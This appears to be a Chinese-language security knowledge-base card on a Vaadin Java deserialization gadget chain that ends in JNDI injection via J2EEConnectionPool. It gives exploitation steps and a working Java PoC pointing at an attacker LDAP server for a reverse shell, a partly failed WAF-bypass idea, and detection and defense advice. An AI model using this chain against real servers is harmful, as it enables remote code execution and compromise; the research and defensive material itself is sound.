---
id: web-java-deser-vaadin-sqlcontainer-tablequery-connectionpool-jndi
title: Vaadin AbstractSelect.getValue → SQLContainer.containsId → TableQuery.containsRowWithKey → J2EEConnectionPool.lookupDataSource 的原生反序列化 JNDI 链（TemplatesImpl 被禁时的替代 sink）
type: scenario
domain: web
path: web/java/deserialization
technique: vaadin-sqlcontainer-tablequery-jndi-deserialization
aliases:
- Vaadin SQLContainer 反序列化
- J2EEConnectionPool JNDI 链
- TableQuery containsRowWithKey
- AbstractSelect getValue containsId
- ListSelect 反序列化 gadget
tags:
- java
- deserialization
- vaadin
- sqlcontainer
- jndi
- gadget-chain
- tostring-trigger
cve: []
severity: critical
confidence: medium
status: verified
created: '2026-11-10'
updated: '2026-11-09'
verification:
  verified_by: verifier-T2-3W7
  verified_at: '2026-11-09T01:56:42+08:00'
  notes: 已对照原文核对；AbstractSelect.getValue→items.containsId、SQLContainer.containsId 的 RowId 分支、TableQuery.containsRowWithKey/beginTransaction、J2EEConnectionPool.reserveConnection/lookupDataSource 源码均与正文一致；卡内已如实注明作者「直接复制 payload 会报错」、UTF-8 overlong 绕过最终未打通，且去掉 WAF 后 LDAP 回连成功；本次核对未读取图片，回连 shell 仅见截图，未复跑；7.7.14 为测试依赖非受影响版本，未设 affected_versions
---

## 一句话结论

当 Vaadin 的 `vaadin-server`/`vaadin-shared` 与 sqlcontainer 组件同时存在、且黑名单封掉了 `NestedMethodProperty`/`TemplatesImpl` 时，可以换一条完全不同的 sink：`PropertysetItem.toString()` 调 `Property.getValue()`，用 `AbstractSelect`（`ListSelect`）作 `Property` 实现——其 `getValue()` 会执行 `items.containsId(value)`；把 `items` 换成 `SQLContainer`、`value` 换成 `RowId`，链就进入 `SQLContainer.containsId → queryDelegate.containsRowWithKey → TableQuery.beginTransaction → connectionPool.reserveConnection → lookupDataSource`，最终走到 `InitialContext.lookup(dataSourceJndiName)`，即 JNDI 注入。

## 原理

- **为什么 `AbstractSelect` 能当 `Property`**：Vaadin 的 `AbstractSelect`/`ListSelect` 实现了 `Property`，因此可以直接放进 `PropertysetItem` 的 map。`Property.getValue()` 在 `AbstractSelect` 中的实现会取当前选中值并检查它是否属于数据源，即调用 `this.items.containsId(retValue)`。
- **`items` 与 `retValue` 都可控**：`items`（`Container`）与 `value` 都是字段，序列化前用反射写入即可。把 `items` 设为 `SQLContainer`、`value` 设为 `RowId`，进入 `SQLContainer.containsId(Object itemId)`。
- **`SQLContainer.containsId` 的分支**：未命中缓存后，若 `itemId instanceof RowId && !(itemId instanceof TemporaryRowId)`，则执行 `return this.queryDelegate.containsRowWithKey(((RowId)itemId).getId())`。`queryDelegate` 同样是可控字段，设为 `TableQuery`。
- **`TableQuery.containsRowWithKey`**：把 `primaryKeyColumns`、`filters` 等拼成查询条件后调用 `this.sqlGenerator.generateSelectQuery(...)`，随后 `if (!this.isInTransaction()) this.beginTransaction()`。`beginTransaction()` 里执行 `this.activeConnection = this.connectionPool.reserveConnection()`——`connectionPool` 可控。
- **为什么最后是 JNDI**：把 `connectionPool` 设为 `J2EEConnectionPool`，其 `reserveConnection()` 调 `getDataSource()`，后者在 `dataSource == null` 时走 `lookupDataSource()`：
  ```java
  InitialContext ic = new InitialContext();
  return (DataSource) ic.lookup(this.dataSourceJndiName);
  ```
  `dataSourceJndiName` 是可控字段（构造参数），因此整个反序列化链以一次 `lookup` 收尾，可指向攻击者控制的 LDAP/RMI 服务。
- 相比 `NestedMethodProperty + TemplatesImpl` 这条链，本链**不依赖 `TemplatesImpl`、也不依赖 `NestedMethodProperty`**，只是把「getter/property 值求值」这个触发面重新接到 JNDI，属于同触发面、不同 sink 的替换。

## 触发条件

- Java 原生反序列化入口存在；`BadAttributeValueExpException`（或其他对可控对象调 `toString` 的触发器）未被禁用。
- classpath 含 Vaadin（`vaadin-server`/`vaadin-shared`，原文 7.7.14）与 `vaadin-sqlcontainer` 相关类（`SQLContainer`、`TableQuery`、`J2EEConnectionPool`、`DefaultSQLGenerator`、`RowId`）。
- 过滤器黑名单未覆盖 `ListSelect`/`AbstractSelect`/`PropertysetItem`/`SQLContainer`/`TableQuery`/`J2EEConnectionPool`（原文靶场的两层 WAF 恰好都点名了这些类，需先做绕过，见「变体与关联」）。
- 目标能访问攻击者的 LDAP/RMI；JDK 高版本下需配合本地 gadget（`trustURLCodebase=false`）。

## 利用步骤

1. 构造 `J2EEConnectionPool`，`dataSourceJndiName` 指向 `ldap://attacker:1389/...`。
2. 用 `ReflectionFactory.newConstructorForSerialization` 得到无参 `TableQuery` 实例（避免构造器依赖），反射填 `primaryKeyColumns`（空 `ArrayList`）、`fullTableName`、`sqlGenerator`（`new DefaultSQLGenerator()`）与 `connectionPool`。
3. 反射构造 `SQLContainer`（无参构造可用），把 `queryDelegate` 设为上一步的 `TableQuery`。
4. `new ListSelect()`，反射设置 `items = sqlContainer`、`value = new RowId("id")`、`multiSelect = true`。
5. `PropertysetItem.addItemProperty("key", listSelect)`；把该 item 反射写入 `BadAttributeValueExpException.val`。
6. 序列化投递；反序列化时 `toString` → `getValue` → `containsId` → `containsRowWithKey` → `reserveConnection` → `lookup` 触发 JNDI。

## PoC

```java
J2EEConnectionPool pool = new J2EEConnectionPool("ldap://attacker:1389/Basic/ReverseShell/attacker/2333");

Constructor<?> c = ReflectionFactory.getReflectionFactory()
        .newConstructorForSerialization(TableQuery.class, Object.class.getConstructor());
TableQuery tq = (TableQuery) c.newInstance();
setFieldValue(tq, "primaryKeyColumns", new ArrayList<>());
setFieldValue(tq, "fullTableName", "test");
setFieldValue(tq, "sqlGenerator", new DefaultSQLGenerator());
setFieldValue(tq, "connectionPool", pool);

SQLContainer sql = (SQLContainer) SQLContainer.class.getDeclaredConstructor().newInstance();
setFieldValue(sql, "queryDelegate", tq);

ListSelect select = new ListSelect();
setFieldValue(select, "value", new RowId("id"));
setFieldValue(select, "multiSelect", true);
setFieldValue(select, "items", sql);

PropertysetItem item = new PropertysetItem();
item.addItemProperty("key", select);

BadAttributeValueExpException ex = new BadAttributeValueExpException("x");
setFieldValue(ex, "val", item);
// 序列化 ex 并投递
```

原文在去掉 WAF 后按此 payload 实测：LDAP 服务端收到 `/Basic/ReverseShell/...` 查询、回连成功并拿到 shell；加上 WAF 时该链被类名黑名单拦下，作者改用 UTF-8 overlong 绕过（见下）。

## 变体与关联

- **触发面变体**：`PropertysetItem.toString` 只是入口之一；`AbstractSelect.getValue` 的 `items.containsId` 也可以由其它调用 `Property.getValue()` 的路径进入（如 `NestedMethodProperty` 直接指向该 `ListSelect` 的 getter）。
- **sink 变体**：`connectionPool` 换成其它实现（`SimpleConnectionPool` 等）会走 JDBC 而不是 JNDI；`queryDelegate` 换成其他 `QueryDelegate` 实现可改变 `containsRowWithKey` 的下游（原文提到另一实现）。
- **与同篇另一条链的关系**：`NestedMethodProperty` + `TemplatesImpl.outputProperties`（同目录另一张卡）在被强黑名单封掉后即失效；本链是「类名不在黑名单里」的替代路径，两条链共用同一个 `PropertysetItem.toString` 触发器。
- **WAF 绕过**：原文对 `new String(payload).contains(...)` 的应用层黑名单 + `resolveClass` 类名前缀黑名单，用重写 `writeClassDescriptor` 把类名以 2/3 字节 UTF-8 overlong 形式写出来绕过；但作者在 `BadAttributeValueExpException.readObject` 处仍报错，**该绕过最终未打通**，因此本卡只把「链本体」记为可复现、把「加 WAF 后」记为未完成（overlong 的通用做法见 `web/java/deserialization/jdk` 下既有卡）。
- 边界：`J2EEConnectionPool`/`SQLContainer` 的字段名与包路径随 Vaadin 版本变化；JDK 高版本需本地 JNDI gadget；原文环境为 JDK 8。

## 检测与防御

- 检测：反序列化流中出现 `SQLContainer`、`TableQuery`、`J2EEConnectionPool`、`DefaultSQLGenerator`、`ListSelect` 组合；`readObject` 栈上出现 `InitialContext.lookup`；进程向外发起 LDAP/RMI 连接且 URL 中带路径（如 `/Basic/ReverseShell/...`）。
- 防御：`ObjectInputFilter` 类白名单（覆盖 `ListSelect`/`PropertysetItem` 等 Vaadin UI 类，反序列化入口不应接受 UI 对象图）；移除不必要的 `vaadin-sqlcontainer`/`J2EEConnectionPool` 可达类；限制出站 LDAP/RMI；升级 JDK 保持 `trustURLCodebase=false` 并管控本地工厂。
